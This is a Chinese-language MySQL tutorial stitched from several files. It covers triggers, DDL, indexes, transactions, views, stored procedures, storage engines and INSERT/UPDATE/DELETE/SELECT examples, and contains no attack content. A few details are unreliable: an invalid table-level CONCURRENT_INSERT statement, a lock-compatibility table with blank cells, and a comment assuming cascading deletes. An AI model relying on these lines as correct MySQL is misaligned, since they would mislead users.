### 5.2 创建触发器

```sql
 DELIMITER //
 CREATE TRIGGER before_user_insert
 BEFORE INSERT ON users
 for EACH ROW
 BEGIN
  SET NEW.created_at = NOW();
  SET NEW.updated_at = NOW();
  IF NEW.status IS NULL THEN
  SET NEW.status = 1;
  END IF;
 END //
 CREATE TRIGGER after_order_update
 AFTER UPDATE ON orders
 for EACH ROW
 BEGIN
  IF OLD.status != NEW.status THEN
  INSERT INTO order_status_log (order_id, old_status, new_status, changed_at)
  VALUES (OLD.id, OLD.status, NEW.status, NOW());
  END IF;
 END //
 CREATE TRIGGER after_user_delete
 AFTER DELETE ON users
 for EACH ROW
 BEGIN
  INSERT INTO user_delete_log (user_id, username, deleted_at)
  VALUES (OLD.id, OLD.username, NOW());
 END //
 DELIMITER ;
```

### 5.3 删除触发器

```sql
 DROP TRIGGER IF EXISTS before_user_insert;
```

---

## 数据库操作

**单行写法：创建数据库**
`CREATE DATABASE <库名>`
```sql
-- 创建数据库
CREATE DATABASE mydb;
```

**换行写法：创建数据库并指定字符集**
`CREATE DATABASE <库名> CHARACTER SET <字符集> COLLATE <排序规则>`
```sql
-- 创建数据库并指定字符集与排序规则
CREATE DATABASE mydb
  CHARACTER SET utf8mb4
  COLLATE utf8mb4_unicode_ci;
```

**换行写法：不存在时创建数据库**
`CREATE DATABASE IF NOT EXISTS <库名> [CHARACTER SET <字符集>] [COLLATE <排序规则>]`
```sql
-- 数据库不存在时才创建
CREATE DATABASE IF NOT EXISTS mydb
  CHARACTER SET utf8mb4
  COLLATE utf8mb4_unicode_ci;
```

**单行写法：查看所有数据库**
`SHOW DATABASES`
```sql
-- 查看所有数据库
SHOW DATABASES;
```

**单行写法：查看建库语句**
`SHOW CREATE DATABASE <库名>`
```sql
-- 查看数据库的建库语句
SHOW CREATE DATABASE mydb;
```

**单行写法：查看当前数据库**
`SELECT DATABASE()`
```sql
-- 查看当前使用的数据库
SELECT DATABASE();
```

**单行写法：选择数据库**
`USE <库名>`
```sql
-- 切换到指定数据库
USE mydb;
```

**单行写法：删除数据库**
`DROP DATABASE <库名>`
```sql
-- 删除数据库
DROP DATABASE mydb;
```

**单行写法：存在时删除数据库**
`DROP DATABASE IF EXISTS <库名>`
```sql
-- 数据库存在时才删除
DROP DATABASE IF EXISTS mydb;
```

**单行写法：修改数据库字符集**
`ALTER DATABASE <库名> CHARACTER SET <字符集> COLLATE <排序规则>`
```sql
-- 修改数据库的字符集与排序规则
ALTER DATABASE mydb CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
```

---

## 表操作

**换行写法：创建表**
`CREATE TABLE [IF NOT EXISTS] <表名> (<列定义>[, <表约束>...])`
```sql
-- 创建用户表并包含索引
CREATE TABLE users (
  id INT PRIMARY KEY AUTO_INCREMENT COMMENT '用户ID',
  username VARCHAR(50) NOT NULL UNIQUE COMMENT '用户名',
  email VARCHAR(100) NOT NULL COMMENT '邮箱',
  password VARCHAR(255) NOT NULL COMMENT '密码',
  phone VARCHAR(20) COMMENT '手机号',
  age INT UNSIGNED COMMENT '年龄',
  gender ENUM('男', '女', '保密') DEFAULT '保密' COMMENT '性别',
  status TINYINT DEFAULT 1 COMMENT '状态',
  balance DECIMAL(10,2) DEFAULT 0.00 COMMENT '账户余额',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  INDEX idx_username (username),
  INDEX idx_email (email),
  INDEX idx_status (status)
);
```

**单行写法：查看表字段**
`DESC <表名>`
```sql
-- 查看表字段信息
DESC users;
```

**单行写法：查看列信息**
`SHOW COLUMNS FROM <表名>`
```sql
-- 查看表的列详细信息
SHOW COLUMNS FROM users;
```

**单行写法：查看建表语句**
`SHOW CREATE TABLE <表名>`
```sql
-- 查看表的建表语句
SHOW CREATE TABLE users;
```

**单行写法：查看所有表**
`SHOW TABLES`
```sql
-- 查看当前数据库的所有表
SHOW TABLES;
```

**单行写法：模糊查表**
`SHOW TABLES LIKE '<模式>'`
```sql
-- 模糊查询表名
SHOW TABLES LIKE '%user%';
```

**单行写法：添加列**
`ALTER TABLE <表名> ADD COLUMN <列定义> [AFTER <列名>]`
```sql
-- 在指定列后添加新列
ALTER TABLE users ADD COLUMN address VARCHAR(255) AFTER email;
```

**单行写法：修改列类型**
`ALTER TABLE <表名> MODIFY COLUMN <列名> <新类型> [<约束>]`
```sql
-- 修改列的定义
ALTER TABLE users MODIFY COLUMN phone VARCHAR(20) NOT NULL;
```

**单行写法：重命名列**
`ALTER TABLE <表名> CHANGE COLUMN <旧列名> <新列名> <类型> [<约束>]`
```sql
-- 重命名列并保留类型
ALTER TABLE users CHANGE COLUMN phone telephone VARCHAR(20) NOT NULL;
```

**单行写法：删除列**
`ALTER TABLE <表名> DROP COLUMN <列名>`
```sql
-- 删除指定列
ALTER TABLE users DROP COLUMN address;
```

**单行写法：添加普通索引**
`ALTER TABLE <表名> ADD INDEX <索引名> (<列名>[, <列名>...])`
```sql
-- 添加普通索引
ALTER TABLE users ADD INDEX idx_age (age);
```

**单行写法：添加唯一索引**
`ALTER TABLE <表名> ADD UNIQUE INDEX <索引名> (<列名>[, <列名>...])`
```sql
-- 添加唯一索引
ALTER TABLE users ADD UNIQUE INDEX idx_phone (phone);
```

**单行写法：添加复合索引**
`ALTER TABLE <表名> ADD INDEX <索引名> (<列名1>, <列名2>[, ...])`
```sql
-- 添加复合索引
ALTER TABLE users ADD INDEX idx_age_gender (age, gender);
```

**单行写法：添加外键**
`ALTER TABLE <表名> ADD CONSTRAINT <约束名> FOREIGN KEY (<列名>) REFERENCES <父表>(<父列>)`
```sql
-- 添加外键约束
ALTER TABLE orders ADD CONSTRAINT fk_user_id FOREIGN KEY (user_id) REFERENCES users(id);
```

**单行写法：删除外键**
`ALTER TABLE <表名> DROP FOREIGN KEY <约束名>`
```sql
-- 删除外键约束
ALTER TABLE orders DROP FOREIGN KEY fk_user_id;
```

**单行写法：重命名表**
`ALTER TABLE <旧表名> RENAME TO <新表名>`
```sql
-- 重命名表
ALTER TABLE users RENAME TO user_info;
```

**单行写法：多表重命名**
`RENAME TABLE <旧表名1> TO <新表名1>, <旧表名2> TO <新表名2>`
```sql
-- 同时重命名多个表
RENAME TABLE users TO user_info, orders TO order_info;
```

**单行写法：删除表**
`DROP TABLE <表名>`
```sql
-- 删除表
DROP TABLE users;
```

**单行写法：存在时删除表**
`DROP TABLE IF EXISTS <表名>`
```sql
-- 表存在时才删除
DROP TABLE IF EXISTS users;
```

**单行写法：删除多表**
`DROP TABLE IF EXISTS <表名1>, <表名2>[, ...]`
```sql
-- 同时删除多个表
DROP TABLE IF EXISTS users, orders, products;
```

**单行写法：清空表**
`TRUNCATE TABLE <表名>`
```sql
-- 清空表数据
TRUNCATE TABLE users;
```

**单行写法：仅复制表结构**
`CREATE TABLE <新表> LIKE <源表>`
```sql
-- 仅复制表结构不复制数据
CREATE TABLE users_copy LIKE users;
```

**单行写法：复制结构和数据**
`CREATE TABLE <新表> AS SELECT * FROM <源表>`
```sql
-- 复制表结构和全部数据
CREATE TABLE users_copy AS SELECT * FROM users;
```

**单行写法：复制部分数据**
`CREATE TABLE <新表> AS SELECT * FROM <源表> WHERE <条件>`
```sql
-- 复制表结构并复制符合条件的数据
CREATE TABLE users_copy AS SELECT * FROM users WHERE status = 1;
```

---

## 索引操作

**单行写法：创建普通索引**
`CREATE INDEX <索引名> ON <表名>(<列名>[, <列名>...])`
```sql
-- 创建单列普通索引
CREATE INDEX idx_username ON users(username);
```

**单行写法：创建复合索引**
`CREATE INDEX <索引名> ON <表名>(<列名1>, <列名2>[, ...])`
```sql
-- 创建多列复合索引
CREATE INDEX idx_name_status ON users(username, status);
```

**单行写法：创建唯一索引**
`CREATE UNIQUE INDEX <索引名> ON <表名>(<列名>[, <列名>...])`
```sql
-- 创建单列唯一索引
CREATE UNIQUE INDEX idx_email ON users(email);
```

**单行写法：创建复合唯一索引**
`CREATE UNIQUE INDEX <索引名> ON <表名>(<列名1>, <列名2>[, ...])`
```sql
-- 创建多列复合唯一索引
CREATE UNIQUE INDEX idx_order_product ON order_items(order_id, product_id);
```

**单行写法：创建前缀索引**
`CREATE INDEX <索引名> ON <表名>(<列名>(<长度>))`
```sql
-- 为长字符串创建前缀索引
CREATE INDEX idx_email_prefix ON users(email(10));
```

**单行写法：创建全文索引**
`ALTER TABLE <表名> ADD FULLTEXT INDEX <索引名> (<列名>[, <列名>...])`
```sql
-- 为文本列创建全文索引
ALTER TABLE articles ADD FULLTEXT INDEX ft_title_content (title, content);
```

**单行写法：查看表索引**
`SHOW INDEX FROM <表名>`
```sql
-- 查看表的索引信息
SHOW INDEX FROM users;
```

**单行写法：删除索引**
`DROP INDEX <索引名> ON <表名>`
```sql
-- 删除指定索引
DROP INDEX idx_username ON users;
```

**单行写法：删除主键**
`ALTER TABLE <表名> DROP PRIMARY KEY`
```sql
-- 删除主键索引
ALTER TABLE users DROP PRIMARY KEY;
```

---

## 约束

**换行写法：综合约束建表**
`CREATE TABLE <表名> (<列定义>, <约束定义>...)`
```sql
-- 创建包含多种约束的订单表
CREATE TABLE orders (
  id INT PRIMARY KEY AUTO_INCREMENT,
  order_no VARCHAR(32) NOT NULL UNIQUE COMMENT '订单编号',
  user_id INT NOT NULL COMMENT '用户ID',
  total_amount DECIMAL(10,2) NOT NULL DEFAULT 0.00 COMMENT '订单总额',
  status TINYINT NOT NULL DEFAULT 1 COMMENT '状态',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (user_id) REFERENCES users(id)
    ON DELETE RESTRICT
    ON UPDATE CASCADE,
  CHECK (total_amount >= 0),
  CHECK (status IN (1, 2, 3, 4, 5))
);
```

---

## 事务

**单行写法：开启事务**
`START TRANSACTION` / `BEGIN`
```sql
-- 开启事务
START TRANSACTION;
```

**换行写法：提交事务**
`COMMIT`
```sql
-- 提交事务并持久化变更
START TRANSACTION;
INSERT INTO users (username, email) VALUES ('张三', 'zhangsan@example.com');
UPDATE accounts SET balance = balance - 100 WHERE user_id = 1;
COMMIT;
```

**单行写法：回滚事务**
`ROLLBACK`
```sql
-- 回滚事务撤销变更
ROLLBACK;
```

**换行写法：使用保存点**
`SAVEPOINT <保存点名>` / `ROLLBACK TO <保存点名>`
```sql
-- 使用保存点部分回滚
START TRANSACTION;
INSERT INTO users (username) VALUES ('张三');
SAVEPOINT sp1;
INSERT INTO users (username) VALUES ('李四');
ROLLBACK TO sp1;
COMMIT;
```

**单行写法：查看隔离级别**
`SELECT @@transaction_isolation`
```sql
-- 查看当前事务隔离级别
SELECT @@transaction_isolation;
```

**单行写法：设置会话隔离级别**
`SET SESSION TRANSACTION ISOLATION LEVEL <级别>`
```sql
-- 设置会话隔离级别为读已提交
SET SESSION TRANSACTION ISOLATION LEVEL READ COMMITTED;
```

**单行写法：设置全局隔离级别**
`SET GLOBAL TRANSACTION ISOLATION LEVEL <级别>`
```sql
-- 设置全局隔离级别为可序列化
SET GLOBAL TRANSACTION ISOLATION LEVEL SERIALIZABLE;
```

---

## 视图

**换行写法：创建简单视图**
`CREATE VIEW <视图名> AS <SELECT 语句>`
```sql
-- 创建只读视图
CREATE VIEW active_users AS
SELECT id, username, email, status
FROM users
WHERE status = 1;
```

**换行写法：创建多表视图**
`CREATE VIEW <视图名> AS <多表 JOIN 查询>`
```sql
-- 创建多表关联视图
CREATE VIEW order_details AS
SELECT
  o.id AS order_id,
  o.order_no,
  u.username,
  u.email,
  o.total_amount,
  o.status
FROM orders o
INNER JOIN users u ON o.user_id = u.id;
```

**单行写法：查询视图**
`SELECT <列名> FROM <视图名> [WHERE <条件>]`
```sql
-- 查询视图数据
SELECT * FROM active_users WHERE username LIKE '张%';
```

**换行写法：替换视图定义**
`CREATE OR REPLACE VIEW <视图名> AS <SELECT 语句>`
```sql
-- 替换已有视图的定义
CREATE OR REPLACE VIEW active_users AS
SELECT id, username, email, status, created_at
FROM users
WHERE status = 1;
```

**单行写法：删除视图**
`DROP VIEW [IF EXISTS] <视图名>`
```sql
-- 删除视图
DROP VIEW IF EXISTS active_users;
```

**单行写法：查看视图定义**
`SHOW CREATE VIEW <视图名>`
```sql
-- 查看视图的建语句
SHOW CREATE VIEW order_details;
```

---

## 存储过程

**换行写法：创建带 IN 参数的存储过程**
`CREATE PROCEDURE <过程名>(IN <参数名> <类型>[, ...]) BEGIN <过程体> END`
```sql
-- 创建带输入参数的存储过程
DELIMITER //
CREATE PROCEDURE get_user_by_age(IN min_age INT, IN max_age INT)
BEGIN
  SELECT * FROM users
  WHERE age BETWEEN min_age AND max_age
  ORDER BY age;
END //
DELIMITER ;
```

**换行写法：创建带 OUT 参数的存储过程**
`CREATE PROCEDURE <过程名>(OUT <参数名> <类型>[, ...]) BEGIN <过程体> END`
```sql
-- 创建带输出参数的存储过程
DELIMITER //
CREATE PROCEDURE count_users_by_status(OUT active_count INT, OUT inactive_count INT)
BEGIN
  SELECT COUNT(*) INTO active_count FROM users WHERE status = 1;
  SELECT COUNT(*) INTO inactive_count FROM users WHERE status = 0;
END //
DELIMITER ;
```

**单行写法：调用无参存储过程**
`CALL <过程名>()`
```sql
-- 调用无参存储过程
CALL get_all_users();
```

**单行写法：调用带 IN 参数的存储过程**
`CALL <过程名>(<参数值>[, ...])`
```sql
-- 调用带输入参数的存储过程
CALL get_user_by_age(20, 30);
```

**换行写法：调用带 OUT 参数的存储过程**
`CALL <过程名>(@<变量名>[, ...])`
```sql
-- 调用带输出参数的存储过程并查看结果
CALL count_users_by_status(@active, @inactive);
SELECT @active AS active_users, @inactive AS inactive_users;
```

**单行写法：删除存储过程**
`DROP PROCEDURE [IF EXISTS] <过程名>`
```sql
-- 删除存储过程
DROP PROCEDURE IF EXISTS get_user_by_age;
```

---

## 触发器

**换行写法：创建插入前触发器**
`CREATE TRIGGER <触发器名> BEFORE INSERT ON <表名> FOR EACH ROW BEGIN <触发体> END`
```sql
-- 插入前自动填充时间字段
DELIMITER //
CREATE TRIGGER before_user_insert
BEFORE INSERT ON users
FOR EACH ROW
BEGIN
  SET NEW.created_at = NOW();
  SET NEW.updated_at = NOW();
  IF NEW.status IS NULL THEN
    SET NEW.status = 1;
  END IF;
END //
DELIMITER ;
```

**换行写法：创建更新后触发器**
`CREATE TRIGGER <触发器名> AFTER UPDATE ON <表名> FOR EACH ROW BEGIN <触发体> END`
```sql
-- 更新后记录状态变更日志
DELIMITER //
CREATE TRIGGER after_order_update
AFTER UPDATE ON orders
FOR EACH ROW
BEGIN
  IF OLD.status != NEW.status THEN
    INSERT INTO order_status_log (order_id, old_status, new_status, changed_at)
    VALUES (OLD.id, OLD.status, NEW.status, NOW());
  END IF;
END //
DELIMITER ;
```

**单行写法：删除触发器**
`DROP TRIGGER [IF EXISTS] <触发器名>`
```sql
-- 删除触发器
DROP TRIGGER IF EXISTS before_user_insert;
```

<!-- ============ 文档分隔线：020-mysql/009-MyISAMStorageEngine.md ============ -->

## 1. MyISAM 概述

MyISAM 是 MySQL 最早的默认存储引擎（5.5 之前），以简单高效著称，但不支持事务和行级锁。

### 1.1 核心特性

| 特性     | 说明                         |
| -------- | ---------------------------- |
| 事务支持 | 不支持                       |
| 锁粒度   | 表级锁                       |
| 外键     | 不支持                       |
| 崩溃恢复 | 需要手动修复（REPAIR TABLE） |
| 全文索引 | 支持                         |
| 空间索引 | 支持                         |
| 压缩表   | 支持（myisampack）           |
| MVCC     | 不支持                       |

### 1.2 存储文件

```mermaid
flowchart TD
    T0["MyISAM 表由三个文件组成："]
    T1["table_name.frm   — 表结构定义"]
    T2["table_name.MYD   — 数据文件（MYData）"]
    T3["table_name.MYI   — 索引文件（MYIndex）"]
    T0 --> T1
    T0 --> T2
    T0 --> T3
```

## 2. 表级锁机制

### 2.1 锁类型

| 锁类型 | 说明                 |
| ------ | -------------------- |
| 读锁   | 共享锁，多个读可并发 |
| 写锁   | 排他锁，独占表       |

### 2.2 锁兼容性

|      | 读锁 | 写锁 |
| ---- | ---- | ---- |
| 读锁 |      |      |
| 写锁 |      |      |

```sql
-- 手动加锁
LOCK TABLES employees READ;     -- 读锁
LOCK TABLES employees WRITE;    -- 写锁
UNLOCK TABLES;                  -- 释放所有锁

-- MyISAM 写操作自动加写锁
INSERT INTO myisam_table VALUES (1, 'test');
-- 整个表被锁定，其他连接无法读写
```

### 2.3 并发插入

```sql
-- MyISAM 支持并发插入（CONCURRENT INSERT）
-- 条件：表没有空洞（未删除过行）或使用动态行格式

-- 设置并发插入
ALTER TABLE myisam_table CONCURRENT_INSERT = 1;  -- 默认
-- = 0：禁止并发插入
-- = 1：无空洞时允许
-- = 2：始终允许（在表末尾插入）
```

## 3. 行格式

### 3.1 静态行格式（FIXED）

```sql
-- 所有列使用定长类型时使用静态行格式
CREATE TABLE fixed_table (
    id    INT NOT NULL,
    name  CHAR(50) NOT NULL,
    age   SMALLINT NOT NULL
) ENGINE = MyISAM ROW_FORMAT = FIXED;

-- 特点：
-- - 每行长度固定，查找速度快
-- - 可直接计算行位置
-- - 空间利用率低
```

### 3.2 动态行格式（DYNAMIC）

```sql
-- 包含变长列时使用动态行格式
CREATE TABLE dynamic_table (
    id    INT NOT NULL,
    name  VARCHAR(200),
    bio   TEXT
) ENGINE = MyISAM ROW_FORMAT = DYNAMIC;

-- 特点：
-- - 行长度可变，空间利用率高
-- - 更新可能导致行碎片
-- - 需要定期 OPTIMIZE TABLE
```

### 3.3 压缩行格式（COMPRESSED）

```bash
# 使用 myisampack 压缩只读表
myisampack table_name

# 压缩后表只读，空间节省 40%-70%
```

## 4. 全文索引

```sql
-- MyISAM 原生支持全文索引
CREATE FULLTEXT INDEX idx_content ON articles(title, content);

SELECT * FROM articles
WHERE MATCH(title, content) AGAINST('MySQL 索引');

-- 布尔模式
SELECT * FROM articles
WHERE MATCH(title, content) AGAINST('+MySQL +索引 -优化' IN BOOLEAN MODE);
```

## 5. 崩溃恢复

```sql
-- 检查表
CHECK TABLE myisam_table;

-- 修复表
REPAIR TABLE myisam_table;
REPAIR TABLE myisam_table EXTENDED;  -- 更彻底的修复

-- 优化表（消除碎片）
OPTIMIZE TABLE myisam_table;
```

## 6. MyISAM vs InnoDB

| 特性      | MyISAM           | InnoDB         |
| --------- | ---------------- | -------------- |
| 事务      | 不支持           | 支持           |
| 锁粒度    | 表级锁           | 行级锁         |
| 外键      | 不支持           | 支持           |
| 崩溃恢复  | 手动修复         | 自动恢复       |
| MVCC      | 不支持           | 支持           |
| 全文索引  | 支持             | 5.6+ 支持      |
| COUNT(\*) | 极快（存储行数） | 需要扫描       |
| 适用场景  | 读密集、不需事务 | 通用、事务场景 |

## 7. 适用场景

```sql
-- 适合 MyISAM 的场景：
-- 1. 只读或读多写少的表
-- 2. 不需要事务的日志表
-- 3. 需要全文索引（MySQL 5.5 之前）
-- 4. COUNT(*) 频繁且不需要精确的统计

-- 不适合 MyISAM 的场景：
-- 1. 需要事务的 OLTP 系统
-- 2. 高并发写入
-- 3. 需要外键约束
-- 4. 对数据安全要求高
```
## 引擎查看

**基本写法：查看服务器支持的引擎**
`SHOW ENGINES;`

```sql
-- 查看所有存储引擎及默认引擎
SHOW ENGINES;
```

**基本写法：查看当前默认引擎**
`SHOW VARIABLES LIKE 'default_storage_engine';`

```sql
-- 查看默认存储引擎（MySQL 8.0+ 默认 InnoDB）
SHOW VARIABLES LIKE 'default_storage_engine';
```

**基本写法：查看表使用的引擎**
`SHOW TABLE STATUS FROM <数据库名> [LIKE '<表名>'];`

```sql
-- 查看 mydb 库所有表的引擎
SHOW TABLE STATUS FROM mydb;
-- 查看指定表引擎
SHOW TABLE STATUS FROM mydb LIKE 'users';
```

---

## 引擎指定与修改

**基本写法：建表时指定引擎**
`CREATE TABLE <表名> (...) ENGINE = <引擎名>;`

```sql
-- 创建 InnoDB 表（默认）
CREATE TABLE orders (
  id BIGINT PRIMARY KEY,
  amount DECIMAL(10,2)
) ENGINE = InnoDB;

-- 创建 MyISAM 表（只读分析场景）
CREATE TABLE logs (
  id BIGINT PRIMARY KEY,
  msg TEXT
) ENGINE = MyISAM;
```

**基本写法：修改表引擎**
`ALTER TABLE <表名> ENGINE = <新引擎>;`

```sql
-- 将 MyISAM 表转为 InnoDB（支持事务）
ALTER TABLE logs ENGINE = InnoDB;
```

---

## InnoDB 配置

**基本写法：查看 InnoDB 状态**
`SHOW ENGINE INNODB STATUS;`

```sql
-- 查看 InnoDB 内部状态（锁、死锁、缓冲池等）
SHOW ENGINE INNODB STATUS\G
```

**基本写法：查看 InnoDB 缓冲池状态**
`SELECT * FROM information_schema.INNODB_BUFFER_POOL_STATS;`

```sql
-- 查看缓冲池命中率与页信息
SELECT
  pool_id, pool_size, free_buffers, database_pages,
  hit_rate FROM information_schema.INNODB_BUFFER_POOL_STATS;
```

**基本写法：查看 InnoDB 数据字典**
`SELECT * FROM information_schema.INNODB_TABLES WHERE name LIKE '<库>/<表>';`

```sql
-- 查看 InnoDB 内部表元数据
SELECT * FROM information_schema.INNODB_TABLES WHERE name LIKE 'mydb/users';
```

---

## 引擎特性对比命令

**基本写法：查看表行格式与特性**
`SHOW TABLE STATUS FROM <库> LIKE '<表>'\G`

```sql
-- 查看 orders 表的行格式、数据长度、索引长度等
SHOW TABLE STATUS FROM mydb LIKE 'orders'\G
```

**基本写法：查看 InnoDB 页大小**
`SHOW VARIABLES LIKE 'innodb_page_size';`

```sql
-- 查看 InnoDB 页大小（默认 16K）
SHOW VARIABLES LIKE 'innodb_page_size';
```

---

## MyISAM 与 MEMORY 操作

**基本写法：MyISAM 表检查**
`CHECK TABLE <表名> [QUICK|FAST|MEDIUM|EXTENDED];`

```sql
-- 检查 MyISAM 表完整性
CHECK TABLE logs MEDIUM;
```

**基本写法：MyISAM 表修复**
`REPAIR TABLE <表名> [QUICK|EXTENDED];`

```sql
-- 修复损坏的 MyISAM 表
REPAIR TABLE logs EXTENDED;
```

**基本写法：优化表（回收空间）**
`OPTIMIZE TABLE <表名> [, <表2> ...];`

```sql
-- 优化表回收碎片空间（8.4 需 OPTIMIZE_LOCAL_TABLE 权限才可免 binlog）
OPTIMIZE TABLE users, orders;
```

**基本写法：MEMORY 引擎建表**
`CREATE TABLE <表名> (...) ENGINE = MEMORY [MAX_ROWS = <行数>];`

```sql
-- 创建内存表（数据不持久化，重启丢失）
CREATE TABLE session_cache (
  sid VARCHAR(64) PRIMARY KEY,
  data TEXT
) ENGINE = MEMORY MAX_ROWS = 10000;
```

<!-- ============ 文档分隔线：020-mysql/010-SQLDataOperationQuery.md ============ -->

## 1. SQL 概述

### 1.1 SQL 是什么

SQL（Structured Query Language，结构化查询语言）是一种用于管理关系型数据库的标准编程语言。SQL 由 IBM 在 1970 年代开发，后来成为 ANSI（美国国家标准协会）和 ISO（国际标准化组织）的标准。

### 1.2 SQL 语句分类

| 分类    | 全称                         | 说明                             | 典型语句               |
| :------ | :--------------------------- | :------------------------------- | :--------------------- |
| **DDL** | Data Definition Language     | 数据定义语言，用于定义数据库对象 | CREATE、ALTER、DROP    |
| **DML** | Data Manipulation Language   | 数据操作语言，用于操作数据       | INSERT、UPDATE、DELETE |
| **DQL** | Data Query Language          | 数据查询语言，用于查询数据       | SELECT                 |
| **DCL** | Data Control Language        | 数据控制语言，用于控制权限       | GRANT、REVOKE          |
| **TCL** | Transaction Control Language | 事务控制语言，用于管理事务       | COMMIT、ROLLBACK       |

### 1.3 SQL 基本规则

- SQL 语句以分号 `;` 结尾
- SQL 不区分大小写（但习惯上关键字大写）
- 字符串值使用单引号 `' '` 包裹
- 注释使用 `--` 或 `/* */`

## 2. DML (数据操作语言) - Data Manipulation Language

DML 用于插入、更新、删除数据。

### 2.1 插入数据详解

#### 2.1.1 基本 INSERT

```sql
 inSERT INTO users (id, username, email, password, age)
 VALUES (1, '张三', 'zhangsan@example.com', 'encrypted_pass', 25);
 inSERT INTO users (username, email, password, age)
 VALUES ('张三', 'zhangsan@example.com', 'encrypted_pass', 25);
 inSERT INTO users SET
  username = '李四',
  email = 'lisi@example.com',
  password = 'encrypted_pass',
  age = 30;
```

#### 2.1.2 批量插入

```sql
 inSERT INTO users (username, email, password, age) VALUES
 ('王五', 'wangwu@example.com', 'pass1', 28),
 ('赵六', 'zhaoliu@example.com', 'pass2', 32),
 ('钱七', 'qianqi@example.com', 'pass3', 27);
 inSERT INTO users (username, email) VALUES
 ('孙八', 'sunba@example.com'),
 ('周九', 'zhoujiu@example.com');
```

#### 2.1.3 插入查询结果

```sql
 inSERT INTO users (username, email, password, age)
 SELECT username, email, password, age FROM old_users WHERE status = 1;
 inSERT IGNORE INTO users (username, email)
 SELECT username, email FROM temp_users;
```

#### 2.1.4 INSERT 高级用法

```sql
 inSERT INTO users (id, username, email) VALUES (1, '张三', 'new_email@example.com')
 ON DUPLICATE KEY UPDATE email = 'new_email@example.com', updated_at = NOW();
 inSERT IGNORE INTO users (username, email) VALUES ('张三', 'test@example.com');
 replace INTO users (id, username, email) VALUES (1, '张三', 'new_email@example.com');
 inSERT INTO users (username, email) VALUES ('测试', 'test@example.com');
 SELECT LAST_INSERT_ID();
```

### 2.2 更新数据详解

#### 2.2.1 基本 UPDATE

```sql
 UPDATE users SET age = 26 WHERE id = 1;
 UPDATE users SET age = age + 1 WHERE age < 30;
 UPDATE users
 SET age = 27, email = 'new_email@example.com', updated_at = NOW()
 WHERE id = 1;
```

#### 2.2.2 UPDATE 高级用法

```sql
 UPDATE users u
 JOIN user_profiles p ON u.id = p.user_id
 SET u.avatar = p.avatar_url, u.status = p.status
 WHERE u.id = 1;
 UPDATE users
 SET balance = (SELECT SUM(amount) FROM orders WHERE user_id = users.id)
 WHERE id = 1;
 UPDATE users SET last_login_time = NOW() WHERE last_login_time IS NULL;
 START TRANSACTION;
 UPDATE accounts SET balance = balance - 100 WHERE id = 1;
 UPDATE accounts SET balance = balance + 100 WHERE id = 2;
 commit;
```

#### 2.2.3 UPDATE 实战示例

```sql
 UPDATE employees_info SET Employees_name = '王西' WHERE Employees_id = 'xz100101';
 UPDATE employees_info SET Post_id = 'xs1001' WHERE Employees_id = 'xs100103';
 UPDATE customer_info
 SET Customer_name = '柳甜', Customer_Birth = NULL, Telephone = '13879008942'
 WHERE Customer_name = '柳田';
 UPDATE sales_list SET Sales_Number = Sales_Number + 5 WHERE Sales_Number < 10;
 UPDATE orders SET status = 3, shipped_at = NOW() WHERE status = 2 AND shipped_at IS NULL;
```

### 2.3 删除数据详解

#### 2.3.1 基本 DELETE

```sql
 delete FROM users WHERE id = 1;
 delete FROM users WHERE status = 0 AND created_at < '2024-01-01';
 delete FROM users;
 delete FROM users ORDER BY created_at DESC LIMIT 10;
```

#### 2.3.2 DELETE 高级用法

```sql
 delete u FROM users u
 JOIN inactive_users i ON u.email = i.email
 WHERE u.status = 0;
 delete FROM users WHERE id IN (SELECT user_id FROM old_users WHERE created_at < '2023-01-01');
 delete FROM users WHERE id = 1; -- 订单表中的相关记录会自动删除
```

#### 2.3.3 DELETE 与 TRUNCATE 区别

| 特性   | DELETE             | TRUNCATE             |
| :----- | :----------------- | :------------------- |
| 速度   | 慢（一行一行删除） | 快（直接删除数据页） |
| 事务   | 记录日志，可回滚   | 不记录日志，不可回滚 |
| 自增ID | 不会重置           | 重置为 1             |
| WHERE  | 支持               | 不支持               |
| 触发器 | 触发 DELETE 触发器 | 不触发               |

#### 2.3.4 DELETE 实战示例

```sql
 delete FROM mark WHERE studentno = 'xx100104' AND courseno = 'kc1002';
 delete FROM orders WHERE status = 5 AND created_at < DATE_SUB(NOW(), INTERVAL 30 DAY);
 delete FROM logs WHERE created_at < DATE_SUB(NOW(), INTERVAL 3 MONTH);
```

### 2.4 数据操作最佳实践

```sql
 SELECT * FROM users WHERE id = 1 FOR UPDATE;
 START TRANSACTION;
 UPDATE users SET status = 0 WHERE last_login_time < '2023-01-01';
 UPDATE stats SET inactive_users = inactive_users + 1;
 commit;
 EXPLAIN UPDATE users SET status = 0 WHERE last_login_time < '2023-01-01';
 delete FROM logs WHERE created_at < '2023-01-01' LIMIT 1000;
```

## 3. DQL (数据查询语言) - Data Query Language

DQL 是最重要的 SQL 部分，用于从数据库中查询数据。

### 3.1 基础查询详解

#### 3.1.1 SELECT 基础语法

```sql
 SELECT * FROM users;
 SELECT id, username, email FROM users;
 SELECT username, price, quantity, price * quantity AS total FROM order_items;
 SELECT
  id AS user_id,
  username AS name,
  email AS "邮箱地址"
 from users;
 SELECT
  username,
  price,
  quantity,
  price * quantity AS subtotal,
  price * quantity * 0.1 AS tax
 from order_items;
 SELECT DISTINCT status FROM users;
 SELECT DISTINCT province, city FROM addresses;
```

#### 3.1.2 列类型转换

```sql
 SELECT CONCAT(username, ' (', email, ')') AS user_info FROM users;
 SELECT CONCAT_WS(' - ', province, city, district) AS full_address FROM addresses;
 SELECT CAST(price AS CHAR) FROM products;
 SELECT CONVERT(price, CHAR) FROM products;
 SELECT DATE_FORMAT(created_at, '%Y年%m月%d日') AS formatted_date FROM users;
```

### 3.2 条件查询详解

#### 3.2.1 WHERE 子句

```sql
 SELECT * FROM users WHERE age > 25;
 SELECT * FROM users WHERE age >= 25;
 SELECT * FROM users WHERE age < 30;
 SELECT * FROM users WHERE age <= 30;
 SELECT * FROM users WHERE age = 25;
 SELECT * FROM users WHERE age != 25;
 SELECT * FROM users WHERE age <> 25;
```

#### 3.2.2 逻辑运算符

```sql
 SELECT * FROM users WHERE age > 25 AND status = 1;
 SELECT * FROM users WHERE age > 20 AND age < 30 AND gender = '男';
 SELECT * FROM users WHERE status = 1 OR status = 2;
 SELECT * FROM users WHERE username = '张三' OR username = '李四';
